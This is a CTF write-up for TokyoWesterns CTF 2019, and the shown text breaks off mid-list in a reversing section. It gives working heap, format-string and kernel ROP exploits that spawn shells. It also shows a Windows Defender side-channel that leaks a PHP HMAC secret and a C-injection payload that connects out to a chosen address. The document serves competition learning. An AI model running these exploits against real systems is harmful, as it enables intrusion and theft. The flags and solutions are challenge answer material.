# TokyoWesterns CTF 5th 2019


**It's recommended to read our responsive [web version](https://balsn.tw/ctf_writeup/20190831-tokyowesternsctf/) of this writeup.**


 - [TokyoWesterns CTF 5th 2019](#tokyowesterns-ctf-5th-2019)
   - [pwn](#pwn)
     - [nothing more to say](#nothing-more-to-say)
     - [SecureKarte](#securekarte)
     - [printf](#printf)
     - [Asterisk-Alloc](#asterisk-alloc)
     - [Multi Heap](#multi-heap)
     - [gnote](#gnote)
   - [web](#web)
     - [j2x2j](#j2x2j)
     - [PHP Note](#php-note)
       - [Recon](#recon)
       - [Exploit](#exploit)
       - [Failed Attempts](#failed-attempts)
     - [Oneline Calc](#oneline-calc)
       - [Flag 1 (read file as www-data)](#flag-1-read-file-as-www-data)
       - [Failed Attempts](#failed-attempts-1)
     - [Slack emoji converter Kai (unsolved)](#slack-emoji-converter-kai-unsolved)
   - [rev](#rev)
     - [Easy Crack Me](#easy-crack-me)
     - [meow](#meow)
     - [EBC](#ebc)
     - [Holy Grail War](#holy-grail-war)
   - [crypto](#crypto)
     - [real-baby-rsa](#real-baby-rsa)
     - [Simple Logic](#simple-logic)
     - [Happy!](#happy)
     - [M-Poly-Cipher](#m-poly-cipher)


## pwn

### nothing more to say

```python=
from pwn import *
context.arch = "amd64"
#r = process("./warmup")
r = remote("nothing.chal.ctf.westerns.tokyo", 10001)
r.sendlineafter(":)","A".ljust(0x100,"\x00")+p64(0x00601b00)+p64(0x4006db)+p64(0x601a00)*10)
r.sendline(asm(shellcraft.sh()).ljust(0x108,"\x00")+p64(0x601a00))
r.interactive()
```
### SecureKarte

Probability...

```python=
#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *
import sys
import time
import random
host = 'karte.chal.ctf.westerns.tokyo'
port = 10001

binary = "./karte"
context.binary = binary
elf = ELF(binary)
try:
  libc = ELF("./libc.so.6")
  log.success("libc load success")
  system_off = libc.symbols.system
  log.success("system_off = "+hex(system_off))
except:
  log.failure("libc not found !")

def add(size,content):
  r.recvuntil("> ")
  r.sendline("1")
  r.recvuntil("> ")
  r.sendline(str(size))
  r.recvuntil("> ")
  r.send(content)
  r.recvuntil("Added id ")
  return int(r.recvuntil("\n")[:-1])
  pass

def modify(index,content):
  r.recvuntil("> ")
  r.sendline("4")
  r.recvuntil("> ")
  r.sendline(str(index))
  r.recvuntil("> ")
  r.send(content)
  pass

def delete(index):
  r.recvuntil("> ")
  r.sendline("3")
  r.recvuntil("> ")
  r.sendline(str(index))
  pass

if len(sys.argv) == 1:
  r = process([binary, "0"], env={"LD_LIBRARY_PATH":"."})

else:
  r = remote(host ,port)

if __name__ == '__main__':
  r.recvuntil("... ")
  r.send("?")
  for i in xrange(7):
    print i
    index1 = add(0x68,"A"*0x67)
    delete(index1)

  index3 = add(0x21000,"sh\n")
  index1 = add(0x68,"A\n")
  index2 = add(0x68,"A\n")
  delete(index1)
  delete(index2)
  modify(index2,p64(0x602140+5)[:3])
  index1 = add(0x18,"A\n")
  index2 = add(0x68,"A\n")
  delete(index1)
  index1 = add(0x68,"A"*0xb + p64(1) + p64(0x602078) + p64(0x0000deadc0bebeef) + "\n")
  printf_plt = 0x0400760
  modify(0,p64(printf_plt)[:6])
  r.recvuntil("> ")
  r.sendline("5%19$p*")
  r.recvuntil("5")
  libc = int(r.recvuntil("*")[:-1],16) - 0x21b97
  print("libc = {}".format(hex(libc)))
  free_got = 0x602018
  system = libc + 0x4f440
  print("system = {}".format(hex(system)))
  for i in xrange(6):
    r.recvuntil("> ")
    fmt = "%{}c%9$hhn".format((system>>(i*8))&0xff).ljust(0x18,"A") + p64(free_got+i)[:-1]
    print repr(fmt)
    r.send(fmt)
  r.recvuntil("> ")
  r.sendline("AAA")
  r.sendline("%" + str(index3) + "c")
  r.interactive()

```

### printf

```python=
#!/usr/bin/env python
from pwn import *
import re

# TWCTF{Pudding_Pudding_Pudding_purintoehu}

context.arch = 'amd64'
e , l = ELF( './printf' ) , ELF( './libc-d7ab015f68cd23c410d57af6552deb54bcb16ff64177c8f2c671902915b75110.so.6' )
y = remote( 'printf.chal.ctf.westerns.tokyo' , 10001 )


fmt = '%lx.' * 0x30 + 'yuawn'
y.sendlineafter( '?' , fmt )

o = y.recvuntil( 'yuawn' ).split('.')
l.address = int( o[1] , 16 ) - 0x1e7580
success( 'libc -> %s' % hex( l.address ) )
stk = int( o[39] , 16 ) - 0x380
success( 'stack -> %s' % hex( stk ) )


off = stk - ( l.address + 0x1e6598 ) + 0x10 # _IO_file_jumps

one = 0x106ef8
fmt = '%{}c'.format( str( off ) ) + 'a'.ljust( 7 , 'a' ) + p64( l.address + one )
y.sendlineafter( '?' , fmt.ljust( 0xff , '\0' ) )

y.sendline( 'cat flag' )

y.interactive()
```

### Asterisk-Alloc

```python=
from pwn import *

#r = process("./asterisk_alloc")
r = remote("ast-alloc.chal.ctf.westerns.tokyo", 10001)
def realloc(size,content):
    r.sendlineafter(":","3")
    r.sendlineafter(":",str(size))
    if size > 0:
        r.sendafter(": ",content)
    else:
        r.recvuntil(": ")
def malloc(size,content):
    r.sendlineafter(":","1")
    r.sendlineafter(":",str(size))
    r.sendafter(":",content)

def calloc(size,content):
    r.sendlineafter(":","2")
    r.sendlineafter(":",str(size))
    r.sendafter(":",content)

def free(t):
    r.sendlineafter(":","4")
    r.sendlineafter(":",t)



realloc(0x90,"a")
calloc(0x90,"a")
malloc(0x90,"a")
for i in range(8):
    free("r")
val = 0xa760
realloc(0x90,p16(val))
realloc(-1,"a")
realloc(0x90,"a")
realloc(-1,"a")
realloc(0x90,p64(0xfbad1800)+"\x00"*0x19)
data = r.recvuntil("=")
libc = u64(data[1*8:1*8+8])-0x3ed8b0
print hex(libc)

free("m")
realloc(-1,"a")
realloc(0x90,"a")
free("r")
realloc(0x90,p64(libc+0x3ed8e8))
realloc(-1,"a")
realloc(0x90,"a")
realloc(-1,"a")
realloc(0x90,p64(libc+0x4f322))
free("m")


r.interactive()

```
### Multi Heap

```python
from pwn import *

#r = process("./multi_heap")
r = remote("multiheap.chal.ctf.westerns.tokyo", 10001)
def alloc(Type,size,thread):
    r.sendlineafter(":","1")
    r.sendlineafter(":",Type)
    r.sendlineafter(":",str(size))
    r.sendlineafter(":",thread)

def free(idx):
    r.sendlineafter(":","2")
    r.sendlineafter(":",str(idx))

def show(idx):
    r.sendlineafter(":","3")
    r.sendlineafter(":",str(idx))

def edit(idx,size,content):
    r.sendlineafter(":","4")
    r.sendlineafter(":",str(idx))
    r.sendlineafter(":",str(size))
    r.sendafter(":",content)

def copy(src,dst,size,thread):
    r.sendlineafter(":","5")
    r.sendlineafter(":",str(src))
    r.sendlineafter(":",str(dst))
    r.sendlineafter(":",str(size))
    r.sendlineafter(":",thread)

alloc("long",0x500,"m")
alloc("long",0x50,"m")
free(0)
alloc("long",0x30,"m")
show(1)
libc = int(r.recvline()) - 0x3ec0d0
r.recvline()
heap = int(r.recvline()) - 0x11e90

print hex(libc)
print hex(heap)

alloc("char",0x50,"m") #2
alloc("char",0x50,"m") #3
edit(2,0x30,p64(libc+0x3ed8e8)*6)
copy(2,3,0x50,"y2\n3\n")
r.recvuntil("Done")
alloc("char",0x50,"m") #4
alloc("char",0x50,"m") #5

edit(4,0x8,p64(libc+0x4f440))
edit(3,0x8,"/bin/sh\x00")
free(3)
r.interactive()

```

### gnote

```c=
#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>
#include <fcntl.h>
#include <stdint.h>
#include <syscall.h>
#include <string.h>
#include <pthread.h>
#include <sys/mman.h>
#include <signal.h>
struct requests{
        uint32_t cmd;
        uint32_t val;
};
struct requests Req;
uint32_t EEE = 0x40100000;
void* job(void* x){


        __asm__("mov eax,%1\n"
                "LOL: xchg eax,[%0]\n"
                "jmp LOL\n"
                ::"r"(&Req.cmd),"r"(EEE):"rax","memory");
}
void get_shell(int sig){
        system("sh");
}
size_t user_cs, user_ss, user_rflags, user_sp;
void save_status()
{
    __asm__("mov user_cs, cs;"
            "mov user_ss, ss;"
            "mov user_sp, rsp;"
            "pushf;"
            "pop user_rflags;"
            );
    puts("[*]status has been saved.");
}

int main(){
        int tmp;
        signal(SIGSEGV,get_shell);
        save_status();
        char buf[0x300];
        int pfd[0x100];
        for(int i=0;i<0x100;i++)
                pfd[i] = open("/dev/ptmx",O_RDWR);
        for(int i=0;i<0x100;i++)
                close(pfd[i]);


        int fd = open("/proc/gnote",O_RDWR);
        Req.cmd = 1;
        Req.val = 0x2c0;
        write(fd,&Req,sizeof(Req));
        Req.cmd = 5;
        Req.val = 0;
        memset(buf,0,sizeof(buf));
        write(fd,&Req,sizeof(Req));
        write(fd,&Req,sizeof(Req));
        //read(fd,buf,sizeof(buf));
        uint64_t *p = (uint64_t*)buf;
        uint64_t kaddr = p[3]-0x1a35360;
        
        printf("%p\n",(void*)(kaddr+0x11204ca));
        printf("%p\n",(void*)(kaddr));
        uint32_t rsp = ((kaddr+0x11204ca)&0xffffffff) - 0x1000;
        uint64_t* rsp_space = mmap(rsp&(~0xfff),0x4000,PROT_EXEC|PROT_READ|PROT_WRITE ,MAP_PRIVATE|MAP_FIXED|MAP_ANONYMOUS,-1,0);


        uint64_t *prsp = (uint64_t*)(rsp+0x1000);
        int count = 0;
        prsp[count++] = 0x0;
        prsp[count++] = 0x0;
        prsp[count++] = 0x0;

        prsp[count++] = kaddr+0x101c20d;
        prsp[count++] = 0x0;
        prsp[count++] = kaddr+0x1069fe0;
        prsp[count++] = kaddr+0x1580579;
        prsp[count++] = 0x0;
        prsp[count++] = kaddr+0x1069df0;
        prsp[count++] = kaddr+0x103efc4;
        prsp[count++] = 0x0;
        prsp[count++] = kaddr+0x101dd06;
        prsp[count++] = (size_t)get_shell;
        prsp[count++] = user_cs;
        prsp[count++] = user_rflags;
        prsp[count++] = user_sp;
        prsp[count++] = user_ss;

        //read(0,&tmp,sizeof(tmp));
        FILE* fp = fopen("/tmp/data","w");
        for(int i=0;i<0x1000000/8;i++){
                uint64_t val = kaddr+0x11204ca;
                fwrite(&val,sizeof(val),1,fp);
        }
        fclose(fp);
        int datafd = open("/tmp/data",O_RDONLY);
        uint64_t* addr = mmap(0x1c0800000,0x500000,PROT_EXEC|PROT_READ|PROT_WRITE ,MAP_PRIVATE|MAP_FIXED,datafd,0);
        close(datafd);
        //read(0,&tmp,sizeof(tmp));
        pthread_t tid;
        pthread_create(&tid,NULL,job,NULL);
        Req.cmd = 5;
        Req.val = 0;
        while(1)
                write(fd,&Req,sizeof(Req));
        return 0;
}
```

## web

### j2x2j

### PHP Note

#### Recon

Source code:

```php
<?php
include 'config.php';

class Note {
    public function __construct($admin) {
        $this->notes = array();
        $this->isadmin = $admin;
    }

    public function addnote($title, $body) {
        array_push($this->notes, [$title, $body]);
    }

    public function getnotes() {
        return $this->notes;
    }

    public function getflag() {
        if ($this->isadmin === true) {
            echo FLAG;
        }
    }
}

function verify($data, $hmac) {
    $secret = $_SESSION['secret'];
    if (empty($secret)) return false;
    return hash_equals(hash_hmac('sha256', $data, $secret), $hmac);
}

function hmac($data) {
    $secret = $_SESSION['secret'];
    if (empty($data) || empty($secret)) return false;
    return hash_hmac('sha256', $data, $secret);
}

function gen_secret($seed) {
    return md5(SALT . $seed . PEPPER);
}

function is_login() {
    return !empty($_SESSION['secret']);
}

function redirect($action) {
    header("Location: /?action=$action");
    exit();
}

$method = $_SERVER['REQUEST_METHOD'];
$action = $_GET['action'];

if (!in_array($action, ['index', 'login', 'logout', 'post', 'source', 'getflag'])) {
    redirect('index');
}

if ($action === 'source') {
    highlight_file(__FILE__);
    exit();
}


session_start();

if (is_login()) {
    $realname = $_SESSION['realname'];
    $nickname = $_SESSION['nickname'];
    
    $note = verify($_COOKIE['note'], $_COOKIE['hmac'])
            ? unserialize(base64_decode($_COOKIE['note']))
            : new Note(false);
}

if ($action === 'login') {
    if ($method === 'POST') {
        $nickname = (string)$_POST['nickname'];
        $realname = (string)$_POST['realname'];

        if (empty($realname) || strlen($realname) < 8) {
            die('invalid name');
        }

        $_SESSION['realname'] = $realname;
        if (!empty($nickname)) {
            $_SESSION['nickname'] = $nickname;
        }
        $_SESSION['secret'] = gen_secret($nickname);
    }
    redirect('index');
}

if ($action === 'logout') {
    session_destroy();
    redirect('index');
}

if ($action === 'post') {
    if ($method === 'POST') {
        $title = (string)$_POST['title'];
        $body = (string)$_POST['body'];
        $note->addnote($title, $body);
        $data = base64_encode(serialize($note));
        setcookie('note', (string)$data);
        setcookie('hmac', (string)hmac($data));
    }
    redirect('index');
}

if ($action === 'getflag') {
    $note->getflag();
}

?>
```

In this challenge, the objective is to unserilize our unsafe data. The note contains a member `isadmin`. If it's set to true, we can get the juicy flag.

However, the problem is the data is protected with HMAC signature. The `gen_secret()` function is also not vulnerable to length attack. It seems like there is no way to get the secret, or forge the signature.

@kaibro notes that the server in running on Microsoft-IIS/10.0 + PHP/7.3.9. We could probably use some Windows Defense trick as an oracle to leak data. 

This approach is actually proposed by [icchy](https://twitter.com/t0nk42) from the organizers TokyoWesterns in WCTF 2019. Please refer to this [slide](https://westerns.tokyo/wctf2019-gtf/wctf2019-gtf-slides.pdf) by icchy.

For the JSengine implementation, please refer to [this slide](https://recon.cx/2018/brussels/resources/slides/RECON-BRX-2018-Reverse-Engineering-Windows-Defender-s-JavaScript-Engine.pdf) by Alexei Bulazel @0xAlexei.

#### Exploit

By default, the `$_SESSION` object will be serialized and saved in a file in `/var/lib/php/sessions/`. Therefore we can use this Windwos trick to leak the secret. 

For example, the following realname cannot be used. It will be blocked by Windows Defender:

```
<script>X5O!P%@AP[4\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*</script>
```

Windows Defenser even has a built-in JS engine and some interesting base64 detector. This payload will also be blocked. The comment is important. Without the comment it will not get blocked. Such a magic.

```
<script>
eval("WDVPIVAlQEFQWzRcUFpYNTQoUF4pN0NDKTd9JEVJQ0FSLVNUQU5EQVJELUFOVElWSVJVUy1URVNULUZJTEUhJEgrSCo"+"K");
//NUQU5EQVJELUFOVElWSVJVUy1URVNULUZJTEUhJEgrSCoK;
</script>
```

Thus, because `$realname` and `$nickname` are all controllable, we can make our serialized data like this:

```
realname|s:10:"myrealname";nickname|s:179:"<script>
eval("WDVPIVAlQEFQWzRcUFpYNTQoUF4pN0NDKTd9JEVJQ0FSLVNUQU5EQVJELUFOVElWSVJVUy1URVNULUZJTEUhJEgrSCo"+"K");
//NUQU5EQVJELUFOVElWSVJVUy1URVNULUZJTEUhJEgrSCoK;
</script><body>";secret|s:6:"secret";
```

However, without the closing tag `</body>`, the javascript cannot access `document.body.innerHTML`. It simply return `body` which is useless. The JS engine DOM tree parser is different from the modern browser's. Therefore, @sasdf found the inserting order is very important here in order to insert a closing tag.

1. Insert our payload in readname with open body tag `PAYLOAD<body>`. nickname should be empty.
2. The secret will be generated and also be appended in the array.
3. Insert close body tag`</body>` as the nickname.

Now the ordered serialized array will be like this (the length is incorrect, anyway):

```
realname|s:10:"<body>";secret|s:6:"secret";nickname|s:179:"</body>PAYLOAD";
```

So just retrieve the secret byte by byte, Here is the payload by @sasdf:

```
#!/usr/bin/env python3
import requests
s = requests.session()

data = {
  'realname': 'aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa<body>',
  'nickname': '',
}
r = s.post('http://phpnote.chal.ctf.westerns.tokyo/?action=login', data=data)

data = {
  'realname': 'aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa<body>',
  'nickname': '''
</body>
<script>
// entropy QAQQAQ qceO9xEKzbOLk8IG90JtVKqA3prrbfQPqQb0wLksU+e7trdtVPUa1VbfiPnDs41bO2AEMQyySz+J
var aa;
aa=function(l) {
    eval("WDVPIVAlQEFQWzRcUFpYNTQoUF4pN0NDKTd9JEVJQ0FSLVNUQU5EQVJELUFOVElWSVJVUy1URVNULUZJTEUhJEgrSCo" + l);
}

aa(document.body.innerHTML.indexOf('secret') != -1 ?"K":"G")
</script>
''',
}
r = s.post('http://phpnote.chal.ctf.westerns.tokyo/?action=login', data=data)
print(r.text)
```

#### Failed Attempts

- outerHTML: I tried to access the outerHTML so even without closing tag `</body>` it should still work. However the JSengine does not implement this function.
- bypass hash_equals: This function is pretty rebost and it will also check the type.
- base64 truncation: Nope, not work. We cannot control raw base64.


### Oneline Calc

#### Flag 1 (read file as www-data)

After a few fuzzing we realize is C language. Fortunately the server is somehow not stable so we even got this informative message:

```
Warning:  system(): Unable to fork [touch "/var/tmp/oc/oc8h82k4.c" "/var/tmp/oc/oc8h82k4.bin"] in /srv/olc/public/calc.php on line 23

Warning:  system(): Unable to fork [chmod 0600 "/var/tmp/oc/oc8h82k4.c" "/var/tmp/oc/oc8h82k4.bin"] in /srv/olc/public/calc.php on line 24

Warning:  pcntl_fork(): Error 11 in /srv/olc/vendor/misterion/ko-process/src/Ko/ProcessManager.php on line 162

Fatal error:  Uncaught RuntimeException: Failure on pcntl_fork in /srv/olc/vendor/misterion/ko-process/src/Ko/ProcessManager.php:164
Stack trace:
#0 /srv/olc/vendor/misterion/ko-process/src/Ko/ProcessManager.php(190): Ko\ProcessManager->internalFork(Object(Ko\Process))
#1 /srv/olc/public/calc.php(39): Ko\ProcessManager->fork(Object(Closure))
#2 /srv/olc/public/calc.php(64): Calc->compile()
#3 /srv/olc/public/calc.php(111): Calc->eval('1+1')
#4 {main}
  thrown in /srv/olc/vendor/misterion/ko-process/src/Ko/ProcessManager.php on line 164
```

Yes it's C. Let's inject our socket payload:

```cpp=
3;
int f = socket(2, 1);
connect(f, "CONNECTPAYLOAD", 16);
dup2(f, 1);
dup2(f, 2);
int ret = write(4, "Hello", 5);
printf("ret: %d\n", ret);
perror("read");
```

And use this to generate the connect seoncd parameter:

```cpp
#include <stdio.h>
#include <stdlib.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <string.h>

int main(int argc, char const *argv[])  {
    if (argc != 3) {
        printf("Usage: %s ip port", argv[0]);
        return 0;
    }
    struct sockaddr_in serv_addr;
    serv_addr.sin_family = AF_INET;
    serv_addr.sin_port = htons(atoi(argv[2]));
    if(inet_pton(AF_INET, argv[1], &serv_addr.sin_addr)<=0)
    {
        printf("\nInvalid address/ Address not supported \n");
        return -1;
    }

    printf("Size: %d\n", sizeof(serv_addr));
    unsigned char* ptr = (unsigned char*) &serv_addr;
    for (int i=0; i<sizeof(serv_addr); i++) {
        printf("\\x%02x", ptr[i]);
    }
    return 0;
}
```

After playing for a while, we found our user and group is `nobody:nobody` by reading `/proc/self/status`. The flag1 is in `calc.php` which is only readable by `www-data`.

So, let's try the payload in compile time. At compile time we are `www-data`.

```
asm("\n .incbin \"/srv/olc/public/calc.php\" \n");
```

https://sourceware.org/binutils/docs/as/Incbin.html#Incbin

For flag2, please refer to the [author's twitter](https://twitter.com/t0nk42/status/1168429402373275649).

#### Failed Attempts

- php-fpm unix socket: Nope, it does not allow read/write as nobody. It's `0660 www-data:www-data`.
- leaked file descriptor 4, 9: The php-fpm fd is not closed when using `system()`. Refer to this [article](https://www.anquanke.com/post/id/163197) (in Chinese). However, writing to fd 4 is not sending payload to php-fpm. Instead it's sending data to nginx XD. fd 9 is the server socket of php-fpm, accepting connections from this socket can steal other's payload.

### Slack emoji converter Kai (unsolved)

The challenge is about Ghostscript RCE.

Dockerfile:

```
FROM python:3

RUN pip3 install uwsgi flask
RUN apt update && apt install -y \
    ghostscript \
    imagemagick
RUN useradd emoji_kai && \
    mkdir -p /srv/emoji_kai
ADD flag /flag
ADD app.py /srv/emoji_kai/app.py
ADD templates /srv/emoji_kai/templates
ADD uwsgi.ini /srv/emoji_kai/uwsgi.ini
ADD policy.xml /etc/ImageMagick-6/policy.xml
RUN chown root:emoji_kai /flag && chmod 0440 /flag && \
    chown root:emoji_kai -R /srv/emoji_kai/app.py && chmod -R 0440 /srv/emoji_kai/app.py && \
    chown root:emoji_kai -R /srv/emoji_kai/templates && chmod -R 0750 /srv/emoji_kai/templates && \
    chown root:emoji_kai -R /srv/emoji_kai/templates/index.html && chmod -R 0440 /srv/emoji_kai/templates/index.html && \
    chown root:emoji_kai -R /srv/emoji_kai/uwsgi.ini && chmod -R 0440 /srv/emoji_kai/uwsgi.ini && \
    chown root:emoji_kai -R /etc/ImageMagick-6/policy.xml && chmod 0644 /etc/ImageMagick-6/policy.xml
CMD uwsgi --ini /srv/emoji_kai/uwsgi.ini
```

Server code:

```python
from flask import (
    Flask,
    render_template,
    request,
    redirect,
    url_for,
    make_response,
)
import subprocess
import tempfile
import os

def convert_by_imagemagick(fname):
    proc = subprocess.run(["identify", "-format", "%w %h", fname], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    out, err = proc.stdout, proc.stderr
    if len(out) == 0:
        return None
    w, h = list(map(int, out.decode("utf-8").split()))
    r = 128/max(w, h)
    proc = subprocess.run(["convert", "-resize", f"{int(w*r)}x{int(h*r)}", fname, fname], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    out, err = proc.stdout, proc.stderr
    img = open(fname, "rb").read()
    os.unlink(fname)
    return img

app = Flask(__name__)

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/source')
def source():
    return open(__file__).read()

@app.route('/policy.xml')
def imagemagick_policy_xml():
    return open("/etc/ImageMagick-6/policy.xml").read()

@app.route('/conv', methods=['POST'])
def conv():
    f = request.files.get('image', None)
    if not f:
        return redirect(url_for('index'))
    ext = f.filename.split('.')[-1]
    fname = tempfile.mktemp("emoji")
    fname = "{}.{}".format(fname, ext)
    f.save(fname)
    response = make_response()
    img = convert_by_imagemagick(fname)
    if not img:
        return redirect(url_for('index'))
    response.data = img
    response.headers['Content-Disposition'] = 'attachment; filename=emoji_{}'.format(f.filename)
    return response

if __name__ == '__main__':
    app.run(host="0.0.0.0", port=8080)
```

Hint:

```
Our intended solution for Slack emoji converter Kai requires you to exploit Ghostscript like Slack emoji converter from last year's TWCTF.
```

Their last year's challenge is about GhostScript RCE as well. You can check the [writeup](https://ctftime.org/writeup/10912) by BambooFox or [this](https://gitlab.com/mahham/ctf/blob/master/2018-twctf/Readme.md#slack-emoji-converter-267-web) by trupples.

This year, there are a bunch of possible `-dSAFER` bypass CVE [here](https://www.openwall.com/lists/oss-security/2019/08/28/2) recently. 

1. CVE-2019-14811 : Safer Mode Bypass by .forceput Exposure in .pdf_hook_DSC_Creator (701445)
2. CVE-2019-14812 : Safer Mode Bypass by .forceput Exposure in setuserparams (701444)
3. CVE-2019-14813 : Safer Mode Bypass by .forceput Exposure in setsystemparams (701443)
4. CVE-2019-14817 : Safer Mode Bypass by .forceput Exposure in .pdfexectoken and other procedures (701450)

The number in the parentheses incicating the Ghostscript issue number (https://bugs.ghostscript.com/show_bug.cgi?id=701343), but I think none of them is public until now (Sep. 4, 2019). This commit [885444](http://git.ghostscript.com/?p=ghostpdl.git;h=885444fcbe10dc42787ecb76686c8ee4dd33bf33) should patch them all.

Maybe we're requred to develop our 1-day/0-day exploit based on this.

[Intended solution from the author @hhc0null](https://twitter.com/hhc0null/status/1168354715471507456) based on CVE-2019-14811

Another solution is based on similar CVEs. In [SpamAndHex's twitter](https://twitter.com/koczkatamas/status/1168881362398601216), they said their exploit is based on CVE-2019-14812 and CVE-2019-14813.


## rev

### Easy Crack Me

A pretty straightforward challenge. It's a flag checker. So you may need to use z3 or angr to help you get the flag. In my case, I used z3

There are about eight checks for the correct flag

1. The counts of each character: [3,2,2,0,3,2,1,3,3,1,1,3,1,2,2,3]
2. 2~5 checks are the sums and xor results of flag's bytes  
3. A vector that check the bytes in flag are digits or letters [0x80,0x80,0xff,0x80,0xff,0xff,0xff,0xff,0x80,0xff,0xff,0x80,0x80,0xff,0xff,0x80,0xff,0xff,0x80,0xff,0x80,0x80,0xff,0xff,0xff,0xff,0x80,0xff,0xff,0xff,0x80,0xff]. 0x80 represent letter, while 0xff represent digit
4. Another check for the sum of flag's bytes.
5. It checks the some bytes in flag.


If you are really good at using z3. You can make a script to pass all checks. But I was not famillar with If() in Z3. So I don't how to properly pass the first check. So I manually try all the possible combinations to find the correct flag.  


```python=
from pwn import *
from z3 import *
f=open("easy_crack_me-768bbdb6d3c597598d0f0c913941e4e3523af09bcfcff117f81e27158d783b3f").read()


p1=f[0xf40:0xf60] #check 2 
x1=f[0xf60:0xf80] #check 3
x2=f[0xf80:0xfa0] #check 5
p2=f[0xfa0:0xfc0] #check 4
ccc=f[0xfc0:0x1040] #check 6
ddd=""

for i in range(0,len(ccc),4):
  print i
  if u32(ccc[i:i+4]) == 0x80:
    ddd+="+"
  elif u32(ccc[i:i+4]) == 0xff:
    ddd+="_"

s=Solver()
flag=[]
kkk="0123456789abcdef"
Know="df2b487_+__++9_c_2+_++6__4+__4a5" # check 7 and manually try all possible combinations

for i in range(len(Know)):
  if Know[i] == "_":
    flag.append(BitVec("flag"+str(i),32))
    s.add(And(flag[i]<0x3a,flag[i]>0x2f,flag[i]!=0x34,flag[i]!=0x36,flag[i]!=0x33,flag[i]!=0x32,flag[i]!=0x39))
  elif Know[i] == "+":
    flag.append(BitVec("flag"+str(i),32))
    s.add(And(flag[i]>0x60,flag[i]<0x67,flag[i]!=ord("a"),flag[i]!=ord("c")))    
  else:
    flag.append(ord(Know[i]))


temp=[]
temp2=[]
temp3=[]
temp4=[]
for i in range(8):
  t1=0
  t2=0
  for j in range(4):
    t=flag[4*i+j]
    t1+=t
    t2^=t
  temp.append(t1)
  temp2.append(t2)

for i in range(8):
  t1=0
  t2=0
  for j in range(4):
    t=flag[8*j+i]
    t1+=t
    t2^=t
  temp3.append(t1)
  temp4.append(t2)

for i in range(0,len(p1),4):
  s.add(temp[i/4] == u32(p1[i:i+4]))
  s.add(temp2[i/4] == u32(x1[i:i+4]))
  s.add(temp3[i/4] == u32(p2[i:i+4]))
  s.add(temp4[i/4] == u32(x2[i:i+4]))
  
# check 8
ttt=0
for i in range(16):
  ttt+=flag[i*2]
s.add(ttt==1160)

print s.check()

ff="TWCTF{"
for i in flag:
  if type(i)==int:
    ff+=chr(i)
    continue
  ff+=chr(int(str(s.model()[i])))

print ff+"}"

for i in range(0x10):
  tt=0
  for j in ff:
    if j==hex(i)[-1]:
      tt+=1
  print hex(i)[-1]+": "+hex(tt)


#TWCTF{df2b4877e71bd91c02f8ef6004b584a5}
```

### meow

```bash
$ file meow.n
meow.n: NekoVM bytecode (418 global symbols, 323 global fields, 35212 bytecode ops)
```

It's a Neko bytecode reversing challenge. I didn't find out any tool can decompile the bytecode. The only tool I can leverage is `nekoc`

After using nekoc, I find out that it check the width and height of png file. Then it will call random(). The point is that the seed seems to be fixed. Then I stop the reversing.

I guess that we can make a mapping table for every pixel on the png file. Also I found that it somehow sort the pixel every row. So I need another sort-mapping table.

After we have two mapping table. we can easily reconstruct the flag png.

```python=
import numpy as np
import os
import time
width = 768
height = 768


from PIL import Image

# Since I already find out the table, I simply record the value so I don't need to construct it again.
mapp=[5, 58, 56, 661, 234, 32, 190, 237, 117, 576, 552, 371, 345, 492, 439, 339, 251, 351, 375, 152, 155, 91, 385, 137, 549, 696, 599, 436, 263, 69, 211, 348, 171, 294, 624, 286, 480, 514, 571, 134, 503, 57, 101, 390, 96, 467, 17, 508, 45, 199, 151, 207, 677, 228, 94, 471, 203, 40, 148, 419, 9, 669, 242, 3, 198, 68, 6, 412, 256, 31, 478, 22, 88, 187, 274, 67, 526, 163, 125, 38, 666, 225, 217, 410, 353, 37, 25, 204, 473, 532, 186, 127, 183, 33, 92, 106, 487, 59, 120, 223, 511, 376, 573, 685, 47, 51, 635, 579, 342, 214, 634, 93, 139, 179, 54, 41, 221, 520, 512, 102, 181, 161, 158, 443, 254, 167, 413, 113, 560, 335, 55, 80, 296, 252, 176, 272, 288, 12, 269, 566, 26, 24, 382, 30, 265, 365, 87, 475, 7, 625, 4, 562, 21, 79, 95, 268, 219, 150, 35, 734, 60, 85, 191, 154, 350, 136, 62, 358, 293, 386, 325, 404, 83, 356, 239, 373, 368, 112, 445, 103, 142, 145, 0, 603, 48, 568, 195, 97, 701, 621, 275, 28, 165, 52, 114, 421, 189, 122, 129, 18, 743, 706, 259, 209, 143, 19, 50, 238, 206, 128, 236, 75, 416, 333, 192, 738, 285, 168, 71, 138, 597, 16, 73, 149, 672, 162, 76, 673, 231, 194, 713, 141, 130, 505, 72, 482, 119, 337, 77, 166, 178, 606, 10, 208, 563, 751, 111, 360, 684, 304, 66, 146, 454, 432, 104, 46, 222, 767, 761, 184, 564, 557, 529, 400, 132, 20, 586, 694, 1, 116, 108, 366, 524, 131, 250, 124, 558, 569, 140, 226, 315, 667, 359, 450, 396, 230, 82, 188, 426, 23, 43, 659, 616, 27, 233, 528, 753, 749, 361, 308, 551, 617, 290, 727, 115, 464, 543, 593, 289, 522, 316, 641, 109, 84, 297, 240, 299, 352, 213, 282, 702, 61, 100, 490, 388, 346, 15, 609, 255, 554, 587, 578, 105, 279, 411, 29, 762, 394, 311, 36, 741, 224, 283, 537, 340, 44, 697, 323, 90, 469, 180, 414, 329, 229, 664, 680, 312, 653, 157, 241, 483, 405, 497, 264, 331, 49, 670, 401, 343, 655, 322, 74, 656, 607, 455, 243, 246, 726, 65, 470, 486, 218, 690, 174, 319, 321, 34, 736, 202, 395, 332, 384, 584, 291, 64, 759, 561, 307, 589, 663, 305, 271, 757, 387, 232, 612, 580, 220, 383, 215, 362, 354, 78, 660, 459, 700, 397, 507, 604, 2, 623, 424, 698, 525, 98, 160, 13, 594, 277, 403, 273, 548, 379, 402, 374, 750, 156, 598, 752, 249, 643, 730, 423, 267, 320, 172, 463, 630, 197, 357, 425, 501, 417, 707, 306, 153, 662, 298, 540, 39, 257, 398, 742, 745, 453, 756, 675, 370, 